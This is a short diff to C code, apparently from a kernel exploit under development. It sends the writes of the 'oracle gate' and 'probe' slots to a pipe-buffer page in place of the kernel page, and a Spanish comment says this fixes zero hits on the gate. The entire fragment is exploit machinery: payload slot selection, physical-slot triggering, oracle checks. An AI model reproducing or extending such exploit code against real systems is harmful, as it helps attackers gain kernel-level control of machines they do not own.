@@ -999,6 +999,16 @@ static int slide_trigger_physical_slot(size_t slot) {
   if (!select_slide_payload_index(slot)) {
     return 0;
   }
+  /* DZH1: el gate y el probe escriben en la pagina del pipe oracle,
+     no en la del kernel page. Sin este puente el gate da hits=0. */
+  if (slot == P0_ORACLE_GATE_SLOT || slot == P0_ORACLE_PROBE_SLOT) {
+    if (!is_direct_ptr(pipebuf_page_base)) {
+      pr_error("p0 physical slot=%zu oracle page invalid=%016zx\n",
+               slot, pipebuf_page_base);
+      return 0;
+    }
+    page_base = pipebuf_page_base;
+  }
 
   int base_delay = (int)slide_enter_delay_usec();
 #if defined(SLIDE_PHYSICAL_SLOT_DELAYS_USEC)
